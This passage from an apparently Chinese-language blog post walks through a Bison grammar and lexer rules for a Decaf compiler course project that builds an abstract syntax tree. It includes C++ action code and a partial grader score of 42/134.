decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decl: T_VAR T_ID type T_SEMICOLON &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR T_ID array_type T_SEMICOLON &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR T_ID type T_ASSIGN CONSTANT T_SEMICOLON &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">CONSTANT : T_INTCONSTANT | T_CHARCONSTANT | T_STRINGCONSTANT &#123; &#125;;</span><br><span class="line"></span><br><span class="line">method_decls: method_decl method_decls&#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList * block = (decafStmtList*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">blockt: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statements: statement statements &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statement: blockt &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | assign T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | method_call T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_return T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_if &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_while &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_for &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_break T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_continue T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_if: T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt T_ELSE blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafBlock *else_block = (decafBlock *)$<span class="number">7</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,else_block);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_while: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_for: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_break: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_continue: &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_return: T_RETURN T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="built_in">exp</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assign: lvalue T_ASSIGN <span class="built_in">exp</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalue: T_ID &#123;  &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> : T_ID &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;VariableExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_INTCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_CHARCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_STRINGCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | method_call &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | T_NOT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Not&quot;</span>, (decafAllexp*)$<span class="number">2</span>, <span class="literal">NULL</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_MINUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafAllexp*)$<span class="number">2</span>, <span class="literal">NULL</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_PLUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Plus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MINUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MULT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mult&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_DIV <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Div&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MOD <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mod&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEFTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leftshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_RIGHTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Rightshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Geq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Lt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Gt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_EQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Eq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_NEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Neq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_AND <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;And&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_OR <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Or&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    | &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_call: T_ID T_LPAREN para_list_use T_RPAREN &#123;</span><br><span class="line">        decafFunCall *call = <span class="keyword">new</span> decafFunCall();</span><br><span class="line">        decafStmtList* para = (decafStmtList*)$<span class="number">3</span>;</span><br><span class="line">        call-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        call-&gt;put_para(para-&gt;get_para());</span><br><span class="line">        $$ = call;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">  <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">  <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述语法分析器可以完美完成第一个样例，大体包含了对以下部分的处理：</p>
<ul>
<li>类定义，函数定义，函数调用，函数声明，表达式，IF语句，语句块</li>
</ul>
<p>我这里说明几点需要注意的地方</p>
<p>函数参数列表的问题：我们不能提前确定传入函数的参数个数，因此需要利用循环（FOR 语句的处理也是同理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">para_list_use: para_usen &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123; <span class="comment">/* 没有参数 */</span></span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123; <span class="comment">/* 剩余多个参数 */</span></span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123; <span class="comment">/* 剩余一个参数 */</span></span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<ul>
<li>当处理 para_list_use 时，会有2种情况：<ul>
<li>无参数，不需要处理</li>
<li>有参数，进入 para_usen，对于每一个 para_usen 有2种情况：<ul>
<li>剩余多个参数：将 para_use 压栈，继续匹配 para_usen 循环处理</li>
<li>剩余一个参数：将 para_use 压栈</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>常量取值问题：对于常量需要再词法分析时将其字符串拷贝进来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;all_char&#125;                 &#123; yylval.sval = <span class="keyword">new</span> <span class="built_in">string</span>(yytext);<span class="keyword">return</span> T_CHARCONSTANT; &#125;</span><br><span class="line">&#123;all_str&#125;                  &#123; yylval.sval = <span class="keyword">new</span> <span class="built_in">string</span>(yytext);<span class="keyword">return</span> T_STRINGCONSTANT; &#125;</span><br><span class="line">&#123;decimal_num&#125;|&#123;hex_num&#125;    &#123; yylval.sval = <span class="keyword">new</span> <span class="built_in">string</span>(yytext);<span class="keyword">return</span> T_INTCONSTANT; &#125;</span><br></pre></td></tr></table></figure>
<p>注释处理问题：注释需要在词法分析时进行匹配（最好不要返回 token）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;//&quot;</span>[^\n]*  	             &#123; &#125;</span><br><span class="line"><span class="string">&quot;/*&quot;</span>([^\*]|(\*)*[^\*/])*(\*)*<span class="string">&quot;*/&quot;</span> &#123; &#125;       </span><br></pre></td></tr></table></figure>
<p>得分结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  decafast git:(master) ✗ python3 check.<span class="function">py  </span></span><br><span class="line"><span class="function"><span class="title">Correct</span><span class="params">(dev)</span>: 42 / 134</span></span><br><span class="line"><span class="function"><span class="title">Score</span><span class="params">(dev)</span>: 42.00</span></span><br><span class="line"><span class="function">Total Score: 42.00</span></span><br></pre></td></tr></table></figure>
<p>已经匹配了部分样例，剩下的就是完善加调整，最后写一个完整分析器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span 